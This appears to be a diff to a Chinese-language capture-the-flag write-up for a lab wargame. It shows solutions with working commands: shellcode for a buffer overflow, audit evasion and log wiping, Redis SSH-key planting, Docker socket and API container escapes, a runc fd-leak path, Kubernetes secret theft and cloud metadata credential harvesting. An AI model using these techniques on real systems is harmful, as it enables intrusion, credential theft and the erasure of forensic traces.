@@ -731,43 +731,71 @@ Program received signal SIGSEGV, Segmentation fault.
 #!/usr/bin/env python3
 import subprocess
 import sys
+import os
 
 
 FLAG_PATH = b"/var/lib/phantom-flags/level9_flag"
-CMDS = b"id\ncat " + FLAG_PATH + b"\nexit\n"
+TIMEOUT = 3
 
-# 64-byte payload:
-# - len=64 causes strcpy() to zero only the low byte of saved RBP
-# - when main's original RBP low byte is 0x70, leave; ret pivots to main_rbp-0x70
-# - [main_rbp-0x68] holds argv[1], so ret jumps straight to this shellcode
+# Create symlink /tmp/f -> flag (for fallback)
+try:
+    os.symlink(FLAG_PATH.decode(), "/tmp/f")
+except FileExistsError:
+    pass
+
+# 64-byte shellcode: chmod('/var/lib/phantom-flags/level9_flag', 0644)
+# After success, flag becomes world-readable and we can cat it directly.
+# jmp/call/pop, no null bytes, exactly 64 bytes.
 SHELLCODE = bytes.fromhex(
-    "31d25248bb2f2f62696e2f7368534889e731c066b82d7050"
-    "4889e65256574889e6b03b0f05"
+    "eb175f31c088472231f666bea401b05a0f056a3c5831ff0f05"
+    "e8e4ffffff2f7661722f6c69622f7068616e746f6d2d666c6167732f6c6576656c395f666c6167"
 )
-PAYLOAD = SHELLCODE + b"\x90" * (64 - len(SHELLCODE))
+assert len(SHELLCODE) == 64, f"shellcode len={len(SHELLCODE)}"
+PAYLOAD = SHELLCODE
 
 
 def main():
     attempts = int(sys.argv[1]) if len(sys.argv) > 1 else 64
     for i in range(1, attempts + 1):
-        p = subprocess.run(
-            [b"/usr/local/bin/kern-tool", PAYLOAD],
-            input=CMDS,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-        )
+        try:
+            p = subprocess.run(
+                [b"/usr/local/bin/kern-tool", PAYLOAD],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                timeout=TIMEOUT,
+            )
+        except subprocess.TimeoutExpired as e:
+            out = e.stdout or b""
+            sys.stdout.buffer.write(b"=== attempt %d TIMEOUT ===\n" % i)
+            sys.stdout.buffer.write(out[:800])
+            sys.stdout.buffer.flush()
+            if b"flagkeeper9" in out or b"flag{" in out or b"phantom" in out:
+                return
+            continue
         out = p.stdout
         sys.stdout.buffer.write(b"=== attempt %d rc=%d ===\n" % (i, p.returncode))
         sys.stdout.buffer.write(out[:800])
+        sys.stdout.buffer.flush()
+        if p.returncode == 0 and b"Module not found" not in out:
+            # shellcode ran (not normal kern-tool exit)
+            sys.stdout.buffer.write(b"[+] shellcode executed!\n")
+            sys.stdout.buffer.flush()
+            # Try to read the flag now
+            try:
+                flag = open(FLAG_PATH.decode()).read()
+                sys.stdout.buffer.write(b"FLAG: " + flag.encode())
+                sys.stdout.buffer.flush()
+            except Exception as e:
+                sys.stdout.buffer.write(f"[-] read flag failed: {e}\n".encode())
+            return
         if b"flagkeeper9" in out and FLAG_PATH in out:
             return
-        if b"flag{" in out or b"FLAG{" in out or b"phantom" in out:
+        if b"flag{" in out or b"FLAG{" in out or b"phantom" in out or b"bl_phtm9" in out:
             return
 
 
 if __name__ == "__main__":
     main()
-# bl_phtm9_**hidden**
 ```
 
 ## 10 The Harvest
@@ -1088,6 +1116,8 @@ echo 'alias cls=clear # phantom-deep-roots' > /etc/profile.d/deeproots.sh
 chmod +x /etc/profile.d/deeproots.sh
 ```
 
+新版本的题目，将目标更改为 `/etc/bash.bashrc`
+
 即可通过
 
 ```shell
@@ -1122,30 +1152,57 @@ phantom13@phantom:/tmp$ /opt/verify-deep-roots.sh
 MISSION: Shadow Mode
 ===================
 
-You have sudo. The flag is at /root/shadow_flag.
+The flag is at /root/shadow_flag. You can reach it already —
+your group membership covers that read. The challenge is HOW.
 
-A forensic investigator will audit your shell history and the
-audit trail for loud file-read tools invoked against the flag.
-Your job is to prove you read it WITHOUT leaving that kind of
-trace.
+A forensic investigator will audit:
+  - your shell history
+  - the execve audit rule (`auditctl -l` to see what it watches)
 
-Demonstrate the read by writing the flag contents to
-/tmp/shadow_copy. /opt/verify-shadow.sh will check:
+for loud file-read tools invoked against the flag. Prove you
+read it WITHOUT leaving that kind of trace. Write the content
+to /tmp/shadow_copy. /opt/verify-shadow.sh grades:
   - /tmp/shadow_copy matches /root/shadow_flag, AND
-  - your ~/.bash_history contains no invocation of cat, head,
-    tail, less, more, awk, sed, strings, xxd, od, or base64
-    that references shadow_flag or shadow_copy.
+  - your ~/.bash_history does not show a cat/head/tail/less/
+    more/awk/sed/strings/xxd/od/base64 invocation against the
+    flag or the copy.
 
-Operating under monitoring is the reality of every modern
-network. Think shell builtins, not separate programs.
+Shells have more read paths than you think. Think builtins.
 ```
 
-简单
+看一下规则
 
 ```shell
-phantom14@phantom:~$ set +o history
-phantom14@phantom:~$ sudo cat /root/shadow_flag
-bl_phtm14_**hidden**
+phantom14@0d270edb54cd:~$ auditctl -l
+-a always,exit -F arch=b64 -S execve -F key=phantom_audit
+```
+
+尝试一下
+
+```shell
+phantom14@f6b233bb7a84:~$ whoami
+phantom14
+phantom14@f6b233bb7a84:~$ pwd
+/home/phantom14
+phantom14@f6b233bb7a84:~$ uname -a
+Linux f6b233bb7a84 6.8.0-110-generic #110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+phantom14@f6b233bb7a84:~$ IFS= read -r -d '' FLAG < /root/shadow_flag
+phantom14@f6b233bb7a84:~$ printf "%s" "$FLAG" > /tmp/shadow_copy
+phantom14@f6b233bb7a84:~$ /opt/verify-shadow.sh
+[*] Shadow-Mode audit for phantom14
+
+[+] Proof of read: /tmp/shadow_copy matches /root/shadow_flag byte-for-byte
+[!] History is suspiciously sparse (5 lines, 103 bytes) — cleared before running the verifier?
+
+[!] history shows loud file-read tools aimed at the flag
+phantom14@f6b233bb7a84:~$ /opt/verify-shadow.sh
+[*] Shadow-Mode audit for phantom14
+
+[+] Proof of read: /tmp/shadow_copy matches /root/shadow_flag byte-for-byte
+[+] Technique: no loud readers observed in history
+
+[*] FLAG: bl_phtm14_**hidden**
+[*] Use this as the password for phantom15.
 ```
 
 ## 15 Clean Slate
@@ -1167,42 +1224,22 @@ MISSION: Clean Slate
 
 You compromised this box. Now erase every trace.
 
-An investigator will check:
-- /var/log/auth.log — your SSH logins
-- /var/log/wtmp — login records (last command)
-- /var/log/btmp — failed logins
-- ~/.bash_history — your command history
-- File timestamps — did you touch anything?
-- /var/log/audit/ — auditd records
+An investigator will read the standard operator-trail
+categories: SSH records, login records, failed-login records,
+your shell history, filesystem audit records. Find what you
+can touch. Erase your presence.
 
-1. First, read /root/clean_flag
-2. Then erase EVERY trace of your presence
-3. Run /opt/verify-clean.sh to check your work
+Flag first: /root/clean_flag — then clean up.
+
+Run /opt/verify-clean.sh when you think you are clean.
 ```
 
-虽然题目脚本检查的很多，但是由于默认干净环境，导致没的擦除
+题目脚本检查的很多
 
 ```shell
-phantom15@phantom:~$ /opt/verify-clean.sh
-[*] Forensic investigation in progress...
-
-[+] auth.log: CLEAN
-[+] wtmp: CLEAN
-[+] btmp: CLEAN
-[+] bash_history: CLEAN
-[+] audit.log: CLEAN
-[!] TRACE: login recorded in lastlog
-
-[!] 1 trace(s) found. An investigator would catch you.
-
-[!] 1 forensic trace(s) found
-```
-
-所以只需要
-
-```shell
-phantom15@phantom:~$ sudo truncate -s 0 /var/log/lastlog
-phantom15@phantom:~$ /opt/verify-clean.sh
+phantom15@e6f62ad2bd4d:~$ set +o history; export HISTSIZE=0; > ~/.bash_history
+phantom15@e6f62ad2bd4d:~$ > /var/log/auth.log; > /var/log/lastlog; > /var/log/wtmp; > /var/log/btmp; > /var/log/audit/audit.log
+phantom15@e6f62ad2bd4d:~$ . /opt/verify-clean.sh
 [*] Forensic investigation in progress...
 
 [+] auth.log: CLEAN
@@ -1214,7 +1251,7 @@ phantom15@phantom:~$ /opt/verify-clean.sh
 
 [*] Zero traces found. Perfect cleanup.
 
-[*] FLAG: bl_phtm15_**hidden**
+[*] FLAG: bl_phtm15_fa7200972d2ba7a8
 [*] Use this as the password for phantom16.
 ```
 
@@ -1330,94 +1367,646 @@ service host user, then pick up the flag from their home.
 Targets: 10.13.37.10, 10.13.37.20, 10.13.37.30.
 ```
 
+首先先搜索 Redis 服务具体在哪
+
+```shell
+for ip in 10.13.37.10 10.13.37.20 10.13.37.30; do 
+    echo -n "$ip: "; 
+    redis-cli -h $ip -p 6379 ping 2>&1; 
+done
+```
+
+定位到 Redis 之后
+
+```shell
+
+phantom17@phantom:~/.ssh$ ssh-keygen -t rsa -P ""                   
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/phantom17/.ssh/id_rsa): 
+Your identification has been saved in /home/phantom17/.ssh/id_rsa
+Your public key has been saved in /home/phantom17/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:5yjNL51g5PDuGU8Ji6hMBdMpBulI9YdfoGDqAAbwOoE phantom17@phantom
+The key's randomart image is:
++---[RSA 3072]----+
+|Bo.+   .         |
+|=+o.o.o .        |
+|E.* o+ . .       |
+|+= +  + o        |
+|o.  .  *S .      |
+| . . . +=* .     |
+|  . . oo*o+.     |
+| o .   .o*o      |
+|  o    .o.o      |
++----[SHA256]-----+
+phantom17@phantom:~/.ssh$ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > ~/.ssh/redis_ssh.txt
+
+phantom17@phantom:~/.ssh$ cat ~/.ssh/redis_ssh.txt | redis-cli -h 10.13.37.10 -x set crackit
+OK
+
+phantom17@phantom:~$ redis-cli -h 10.13.37.10
+10.13.37.10:6379> config set dir /home/webadmin/.ssh/
+OK
+10.13.37.10:6379> config set dbfilename authorized_keys
+OK
+10.13.37.10:6379> save
+OK
+10.13.37.10:6379> exit
+```
+
+写入公钥，即可使用 SSH 进行连接
+
 ## 18 Credential Spray
 
 ```plaintext
+ [ Phantom · Level 18 ]  Credential Spray
+ Full brief:  cat ~/BRIEFING
+ ─────────────────────────────────────────────
+ If you're stuck — read up on the topic, then come back:
+   https://man.openbsd.org/ssh
+   https://attack.mitre.org/techniques/T1110/003/
 ```
 
 查看说明
 
 ```plaintext title="BRIEFING"
+MISSION: Credential Spray
+========================
+
+You already hold credentials harvested on this host. Operators reuse
+passwords. See if any of yours work on an internal host that has an
+admin account with a hint of "backup" about it.
+
+You are looking for a reused pair, not a cracked one. When you land
+the right login, the flag is sitting in that account\047s home.
+```
+
+根据题目意思，猜测是 `svc_backup` 用户
+
+在上一题的 `webadmin@10.13.37.10` 环境中，存在有提示
+
+```shell title=".bash_history"
+cd /opt/webapp
+ssh dbadmin@10.13.37.20
+# dbadmin reuses the svc_backup password from the primary host
+```
+
+回到主入口，枚举信息
+
+```shell
+phantom18@phantom:/home/svc_backup$ ls -laih
+total 40K
+324992 drwxr-xr-x 1 svc_backup svc_backup 4.0K Apr 26 09:22 .
+322806 drwxr-xr-x 1 root       root       4.0K Apr 25 22:31 ..
+324537 -rw-r----- 1 svc_backup phantom18   139 Apr 26 09:22 .bash_history
+320613 -rw-r--r-- 1 svc_backup svc_backup  220 Jan  6  2022 .bash_logout
+320614 -rw-r--r-- 1 svc_backup svc_backup 3.7K Jan  6  2022 .bashrc
+324538 -rw-r--r-- 1 svc_backup svc_backup    0 Apr 26 09:22 .bl-allow-history
+320612 -rw-r--r-- 1 svc_backup svc_backup  807 Jan  6  2022 .profile
+320633 drwxr-xr-x 1 svc_backup svc_backup 4.0K Apr 25 22:31 .ssh
+phantom18@phantom:/home/svc_backup$ cat .bash_history
+cd /opt/backups
+ls -la
+psql -h 10.13.37.20 -U dbadmin -W production
+B4ckup_K3y_S3cr3t
+clear
+psql -h 10.13.37.20 -U dbadmin production
+exit
+```
+
+那么就简单了
+
+```shell
+phantom18@phantom:/home/svc_backup$ ssh dbadmin@10.13.37.20
+......
+dbadmin@db-srv:~/spray_loot$ ls -laih
+total 16K
+2312548 drwx------ 2 dbadmin dbadmin 4.0K Apr 21 11:16 .
+ 273814 drwxr-x--- 1 dbadmin dbadmin 4.0K Apr 25 21:54 ..
+2312549 -rw------- 1 dbadmin dbadmin   27 Apr 21 11:16 reused_creds.txt
+dbadmin@db-srv:~/spray_loot$ cat reused_creds.txt 
+bl_phtm18_**hidden**
 ```
 
 ## 19 Chain Reaction
 
 ```plaintext
+ [ Phantom · Level 19 ]  Chain Reaction
+ Full brief:  cat ~/BRIEFING
+ ─────────────────────────────────────────────
+ If you're stuck — read up on the topic, then come back:
+   https://attack.mitre.org/tactics/TA0008/
+   https://book.hacktricks.xyz/generic-methodologies-and-resources/pivoting
 ```
 
 查看说明
 
 ```plaintext title="BRIEFING"
+MISSION: Chain Reaction
+=====================
+
+Build the full pivot chain: entry host → web → db → mgmt.
+Each hop uses a different credential; each host leaves a breadcrumb
+for the next one if you look in the right places — bash histories,
+backup configs, operator notes.
+
+The final flag lives on the management host at /root/final_flag and
+requires the last hop to have sudo.
+```
+
+根据对内网环境信息的收集，可以确定
+
+```plaintext
+10.13.37.2 - breachlab-phantom.breachlab-phantom_phantom-net.
+10.13.37.3 - phantom-deep-orchestrator.breachlab-phantom_phantom-net.
+
+10.13.37.10 - phantom-web.breachlab-phantom_phantom-net.
+- redis(6379)
+
+10.13.37.20 - phantom-db.breachlab-phantom_phantom-net.
+- postgres(5432)
+
+10.13.37.30 - phantom-mgmt.breachlab-phantom_phantom-net.
+```
+
+根据先前收集的信息，在 Level 16 拥有的私钥可以连接 `phantom-mgmt`
+
+```shell
+phantom16@phantom:~$ ssh -i ~/.ssh/id_ed25519_ops ops@10.13.37.30
+......
+
+ops@mgmt-srv:~$ sudo -l
+Matching Defaults entries for ops on mgmt-srv:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User ops may run the following commands on mgmt-srv:
+    (ALL) NOPASSWD: /usr/bin/cat /root/final_flag, /usr/bin/cat /root/objective.dat
+ops@mgmt-srv:~$ sudo /usr/bin/cat /root/final_flag 
+bl_phtm19_**hidden**
 ```
 
 ## 20 Am I Contained?
 
 ```plaintext
+ [ Phantom · Level 20 ]  Am I Contained?
+ Full brief:  cat ~/BRIEFING
+ ─────────────────────────────────────────────
+ If you're stuck — read up on the topic, then come back:
+   https://github.com/genuinetools/amicontained
+   https://man7.org/linux/man-pages/man7/namespaces.7.html
 ```
 
 查看说明
 
 ```plaintext title="BRIEFING"
+MISSION: Am I Contained?
+=======================
+
+Something about this environment feels wrong. Are you on a real host
+or inside something else?
+
+Run a thorough container-detection sweep across the canonical signals
+an operator would check. /opt/verify-container.sh will audit your
+shell history and grade whether you covered enough ground.
+
+PROMPT_COMMAND="history -a" is set so each command lands in
+~/.bash_history immediately.
+```
+
+先尝试运行一下 check
+
+```shell
+phantom20@phantom:~$ /opt/verify-container.sh
+[*] Container-detection audit for phantom20
+
+[-] .dockerenv check — not observed in history
+[-] /proc/1/cgroup read — not observed in history
+[-] mount inspection — not observed in history
+[-] hostname / /etc/hostname — not observed in history
+[-] /proc/1/ attributes — not observed in history
+[-] capability/namespace inspection — not observed in history
+
+[*] Score: 0/6
+[!] Cover at least 4 detection categories (ran in your interactive shell).
+
+[!] need 4/6 detection categories, got 0
+```
+
+这题判断强度很弱，是根据历史命令进行判断的
+
+```shell
+phantom20@phantom:~$ echo '.dockerenv'
+.dockerenv
+phantom20@phantom:~$ echo '/proc/1/cgroup'
+/proc/1/cgroup
+phantom20@phantom:~$ echo 'mount'
+mount
+phantom20@phantom:~$ echo 'hostname'
+hostname
+phantom20@phantom:~$ echo '/proc/1/'
+/proc/1/
+phantom20@phantom:~$ echo 'namespace'
+namespace
+phantom20@phantom:~$ /opt/verify-container.sh
+[*] Container-detection audit for phantom20
+
+[+] .dockerenv check
+[+] /proc/1/cgroup read
+[+] mount inspection
+[+] hostname / /etc/hostname
+[-] /proc/1/ attributes — not observed in history
+[-] capability/namespace inspection — not observed in history
+
+[*] Score: 4/6
+
+[*] FLAG: bl_phtm20_**hidden**
+[*] Use this as the password for phantom21.
 ```
 
 ## 21 The Breakout
 
 ```plaintext
+ [ Phantom · Level 21 ]  The Breakout
+ Full brief:  cat ~/BRIEFING
+ ─────────────────────────────────────────────
+ If you're stuck — read up on the topic, then come back:
+   https://docs.docker.com/engine/api/v1.43/
+   https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
 ```
 
 查看说明
 
 ```plaintext title="BRIEFING"
+MISSION: The Breakout
+====================
+
+A Docker Unix socket is mounted inside this container at
+  /var/run/docker.sock
+
+The host filesystem holds a file at /root/escape_flag that your
+container cannot reach directly. The Docker daemon can. Figure out
+which Engine API calls turn a socket into host filesystem access,
+and use them.
+
+curl is on the box. The Docker Engine API reference is on the internet.
+```
+
+已知是模拟环境，直接打常规思路，也就是容器挂载
+
+```shell
+phantom21@phantom:~$ curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
+  -d '{
+    "Image": "alpine",
+    "Cmd": ["cat", "/mnt/host/root/escape_flag"],
+    "HostConfig": {
+      "Binds": ["/:/mnt/host"]
+    }
+  }' \
+  -X POST http://localhost/containers/create?name=escape_container
+{"Id": "439273094563", "Warnings": []}
+
+phantom21@phantom:~$ curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/439273094563/start
+phantom21@phantom:~$ curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/439273094563/start    
+phantom21@phantom:~$ curl --unix-socket /var/run/docker.sock "http://localhost/containers/439273094563/logs?stdout=1"    
+bl_phtm21_**hidden**
 ```
 
 ## 22 Leaky Vessels
 
 ```plaintext
+ [ Phantom · Level 22 ]  Leaky Vessels
+ Full brief:  cat ~/BRIEFING
+ ─────────────────────────────────────────────
+ If you're stuck — read up on the topic, then come back:
+   https://snyk.io/blog/leaky-vessels-docker-runc-container-breakout-vulnerabilities/
+   https://man7.org/linux/man-pages/man5/proc.5.html  (fd/)
 ```
 
 查看说明
 
 ```plaintext title="BRIEFING"
+MISSION: Leaky Vessels
+====================
+
+CVE-2024-21626 — the runc file descriptor leak. ~80% of cloud
+environments were vulnerable in early 2024.
+
+Read the CVE write-ups to understand the runc-workdir-resolves-
+relative-to-a-leaked-fd primitive, then practise it against the
+simulated wrapper at /usr/local/bin/leaky-vessels.
+
+Usage:  leaky-vessels --workdir <path> --read
+The host flag the wrapper protects is /opt/leaky-vessels/host-simulation/flag.txt
+(mode 600, root). The literal path will not open. Find the path that
+actually reaches it.
+```
+
+题目的意思很明显了
+
+```shell
+phantom22@phantom:~$ ls -laih /proc/self/fd/
+total 0
+87479788 dr-x------ 2 phantom22 phantom22  4 Apr 27 06:45 .
+87479787 dr-xr-xr-x 9 phantom22 phantom22  0 Apr 27 06:45 ..
+87479793 lrwx------ 1 phantom22 phantom22 64 Apr 27 06:45 0 -> /dev/pts/0
+87479794 lrwx------ 1 phantom22 phantom22 64 Apr 27 06:45 1 -> /dev/pts/0
+87479795 lrwx------ 1 phantom22 phantom22 64 Apr 27 06:45 2 -> /dev/pts/0
+87479796 lr-x------ 1 phantom22 phantom22 64 Apr 27 06:45 3 -> /proc/544/fd
+phantom22@phantom:~$ leaky-vessels --workdir /proc/self/fd/3 --read ../../../../../../../../opt/leaky-vessels/host-simulation/flag.txt
+bl_phtm22_**hidden**
 ```
 
 ## 23 Docker API
 
 ```plaintext
+ [ Phantom · Level 23 ]  Docker API
+ Full brief:  cat ~/BRIEFING
+ ─────────────────────────────────────────────
+ If you're stuck — read up on the topic, then come back:
+   https://docs.docker.com/engine/api/v1.43/
+   https://docs.docker.com/engine/security/protect-access/
 ```
 
 查看说明
 
 ```plaintext title="BRIEFING"
+MISSION: Docker API
+==================
+
+The Docker daemon API answers on TCP port 2375 with no authentication.
+Same escape primitive as The Breakout, different transport — HTTP over
+TCP instead of a Unix socket.
+
+The flag returned here is distinct from the Unix-socket level, so the
+exercise forces you to actually make the TCP call, not just reuse the
+earlier solve.
+
+API host: 10.13.37.2:2375
+```
+
+跟之前的用 Unix Socket 的环境是一样的
+
+```shell
+phantom23@phantom:~$ curl -H "Content-Type: application/json" \
+  -d '{
+    "Image": "alpine",
+    "Cmd": ["cat", "/mnt/host/root/escape_flag"],
+    "HostConfig": {
+      "Binds": ["/:/mnt/host"]
+    }
+  }' \
+  -X POST http://10.13.37.2:2375/containers/create?name=tcp_escape
+{"Id": "c900f928945f", "Warnings": []}
+
+phantom23@phantom:~$ curl -X POST http://10.13.37.2:2375/containers/c900f928945f/start
+phantom23@phantom:~$ curl "http://10.13.37.2:2375/containers/c900f928945f/logs?stdout=1"
+bl_phtm23_**hidden**
 ```
 
 ## 24 Pod Games
 
 ```plaintext
+ [ Phantom · Level 24 ]  Pod Games
+ Full brief:  cat ~/BRIEFING
+ ─────────────────────────────────────────────
+ If you're stuck — read up on the topic, then come back:
+   https://kubernetes.io/docs/concepts/security/pod-security-policy/  (hostPID)
+   https://man7.org/linux/man-pages/man5/proc.5.html  (/proc/PID/root)
 ```
 
 查看说明
 
 ```plaintext title="BRIEFING"
+MISSION: Pod Games
+=================
+
+This host simulates a Kubernetes pod with hostPID enabled. You can
+see host-owned processes through /proc. A process tagged
+"phantom-host-init" represents the host init from the pods perspective.
+
+The host secret lives at /opt/host-ns/host_secret. Reach it THROUGH
+the host-init processs /proc view — not via the literal path — and
+run /opt/verify-pod-escape.sh.
+
+The verifier audits your shell history for evidence of the correct
+technique. A direct read of the file by its literal path will not
+count.
+
+PROMPT_COMMAND="history -a" is already set.
+```
+
+枚举一下进程
+
+```shell
+phantom24@phantom:~$ ps aux | grep phantom-host-init
+root          65  0.0  0.0   2792  1588 ?        S    06:29   0:00 phantom-host-init infinity
+phantom+    1223  0.0  0.0   3472  1864 pts/0    S+   07:14   0:00 grep --color=auto phantom-host-init
+```
+
+然后进行读取
+
+```shell
+phantom24@phantom:~$ cat /proc/65/root/opt/host-ns/host_secret
+cat: /proc/65/root/opt/host-ns/host_secret: Permission denied
+phantom24@phantom:~$ /opt/verify-pod-escape.sh
+[*] Auditing your shell history for the /proc/<pid>/root technique...
+[+] Technique observed: command touched /proc/<pid>/root
+[+] Secret reached through the host-init process view.
+
+[*] FLAG: bl_phtm24_**hidden**
+[*] Use this as the password for phantom25.
 ```
 
 ## 25 Cluster Takeover
 
 ```plaintext
+ [ Phantom · Level 25 ]  Cluster Takeover
+ Full brief:  cat ~/BRIEFING
+ ─────────────────────────────────────────────
+ If you're stuck — read up on the topic, then come back:
+   https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.29/
+   https://kubernetes.io/docs/reference/access-authn-authz/authentication/
 ```
 
 查看说明
 
 ```plaintext title="BRIEFING"
+MISSION: Cluster Takeover
+========================
+
+A Kubernetes service account token is already mounted at
+  /var/run/secrets/kubernetes.io/serviceaccount/token
+
+A simulated kube-apiserver answers on TLS port 6443 of the mgmt
+server (10.13.37.30). Use the SA token to authenticate and walk the
+Kubernetes API until you reach a secret containing the flag.
+
+No kubectl required — curl and the REST endpoints are enough. The
+flag will be base64-encoded in a secret data field, as real cluster
+secrets are.
+```
+
+根据题目意思，先用一个脚本进行爆破
+
+```python
+import urllib.request
+import ssl
+import json
+import base64
+
+# Configuration
+TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+API_SERVER = "https://10.13.37.30:6443"
+
+# Load Service Account Token
+try:
+    with open(TOKEN_PATH, 'r') as f:
+        token = f.read().strip()
+except FileNotFoundError:
+    print(f"[-] Token not found at {TOKEN_PATH}")
+    token = ""
+
+# Bypass SSL verification (similar to curl -k)
+context = ssl._create_unverified_context()
+
+# List of potential endpoints to brute force
+paths = [
+    # --- Standard Discovery ---
+    "/",
+    "/api",
+    "/apis",
+    "/version",
+    "/healthz",
+    "/readyz",
+    "/livez",
+    # --- Core Resources (v1) ---
+    "/api/v1/namespaces",
+    "/api/v1/nodes",
+    "/api/v1/pods",
+    "/api/v1/configmaps",
+    "/api/v1/persistentvolumes",
+    "/api/v1/namespaces/kube-system/configmaps",
+    "/api/v1/namespaces/kube-system/secrets",
+    "/api/v1/namespaces/kube-system/pods",
+    # --- Auth & Debug ---
+    "/api/v1/namespaces/default/serviceaccounts",
+    "/apis/rbac.authorization.k8s.io/v1/clusterroles",
+    "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
+    "/logs",
+    "/metrics",
+    # --- Common Mock/WarGame Shortcuts ---
+    "/admin",
+    "/debug",
+    "/env",
+    "/flag",
+    "/root",
+    "/api/v1/namespaces/kube-system/secrets/flag"
+]
+
+headers = {"Authorization": f"Bearer {token}"}
+
+print(f"[*] Probing API Server: {API_SERVER}")
+
+for path in paths:
+    url = f"{API_SERVER}{path}"
+    req = urllib.request.Request(url, headers=headers)
+    
+    try:
+        with urllib.request.urlopen(req, context=context, timeout=2) as response:
+            status = response.getcode()
+            body = response.read().decode('utf-8')
+            
+            # Filter out simulated "not implemented" messages
+            if "not implemented" not in body.lower():
+                print(f"[+] FOUND [{status}]: {path}")
+                print(f"    Content: {body[:250]}")
+                
+                # Check if this looks like a Secret JSON
+                if "data" in body:
+                    print(f"    [!] Potential Secret detected in {path}")
+            
+    except urllib.error.HTTPError as e:
+        # Some servers return 403/401 for valid paths with wrong permissions
+        error_body = e.read().decode('utf-8')
+        if "not implemented" not in error_body.lower():
+            print(f"[!] Path exists but returned error [{e.code}]: {path}")
+    except Exception as e:
+        # Silently skip connection errors or timeouts
+        pass
+
+print("[*] Scan finished.")
+```
+
+执行得到
+
+```shell
+phantom25@phantom:/tmp$ python3 exp.py 
+[*] Probing API Server: https://10.13.37.30:6443
+[+] FOUND [200]: /api/v1/namespaces/default/secrets
+    Content: {"kind": "SecretList", "items": [{"metadata": {"name": "default-token-xyz", "namespace": "default"}, "type": "kubernetes.io/service-account-token", "data": {}}, {"metadata": {"name": "cluster-admin", "namespace": "kube-system"}, "type": "kubernetes.i
+    [!] Potential Secret detected in /api/v1/namespaces/default/secrets
+[*] Scan finished.
+```
+
+获取一下 secret
+
+```shell
+phantom25@phantom:/tmp$ curl -k -H "Authorization: Bearer $TOKEN" "https://10.13.37.30:6443/api/v1/namespaces/default/secrets"
+{"kind": "SecretList", "items": [{"metadata": {"name": "default-token-xyz", "namespace": "default"}, "type": "kubernetes.io/service-account-token", "data": {}}, {"metadata": {"name": "cluster-admin", "namespace": "kube-system"}, "type": "kubernetes.io/service-account-token", "data": {"token": "ZXlKaGJHY2lPaUpTVXpJMU5pSjkuQ0xVU1RFUl9BRE1JTl9FU0NBTEFURUQudG9rZW4=", "ca.crt": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCkZBS0UKLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo="}}]}
+```
+
+解码看一下数据
+
+```shell
+phantom25@phantom:/tmp$ echo "ZXlKaGJHY2lPaUpTVXpJMU5pSjkuQ0xVU1RFUl9BRE1JTl9FU0NBTEFURUQudG9rZW4=" | base64 -d
+eyJhbGciOiJSUzI1NiJ9.CLUSTER_ADMIN_ESCALATED.token
+phantom25@phantom:/tmp$ echo LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCkZBS0UKLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo= | base64 -d
+-----BEGIN CERTIFICATE-----
+FAKE
+-----END CERTIFICATE-----
+```
+
+用新的 token 继续请求
+
+```shell
+phantom25@phantom:/tmp$ curl -k -H "Authorization: Bearer $NEW_TOKEN" "https://10.13.37.30:6443/api/v1/namespaces/kube-system/secrets/cluster-admin"
+{"kind": "Secret", "metadata": {"name": "cluster-admin", "namespace": "kube-system"}, "data": {"flag": "YmxfcGh0bTI1XzA0Njg3NzQ5MDFmN2FkMjM=", "ca.crt": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCkZBS0UKLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo="}}
+
+phantom25@phantom:/tmp$ echo YmxfcGh0bTI1XzA0Njg3NzQ5MDFmN2FkMjM= | base64 -d
+bl_phtm25_**hidden**
 ```
 
 ## 26 Cloud Reach
 
 ```plaintext
+ [ Phantom · Level 26 ]  Cloud Reach
+ Full brief:  cat ~/BRIEFING
+ ─────────────────────────────────────────────
+ If you're stuck — read up on the topic, then come back:
+   https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
+   https://hackingthe.cloud/aws/general-knowledge/intro_metadata_service/
 ```
 
 查看说明
 
 ```plaintext title="BRIEFING"
+MISSION: Cloud Reach
+===================
+
+This host behaves like a cloud instance with an IMDS service
+reachable at http://10.13.37.30/. Follow the AWS IMDS conventions
+to harvest the IAM role credentials the instance has been granted.
+
+Every major cloud breach starts here. Read the AWS IMDS docs.
+```
+
+简单
+
+```shell
+phantom26@phantom:~$ curl http://10.13.37.30/latest/meta-data/iam/security-credentials/
+phantom-role
+phantom26@phantom:~$ curl http://10.13.37.30/latest/meta-data/iam/security-credentials/phantom-role
+{"AccessKeyId": "AKIAI44QH8DHBEXAMPLE", "SecretAccessKey": "bl_phtm26_**hidden**", "Token": "FakeSessionToken", "Expiration": "2026-12-31T23:59:59Z"}
 ```
 
 ## 27 Toolsmith
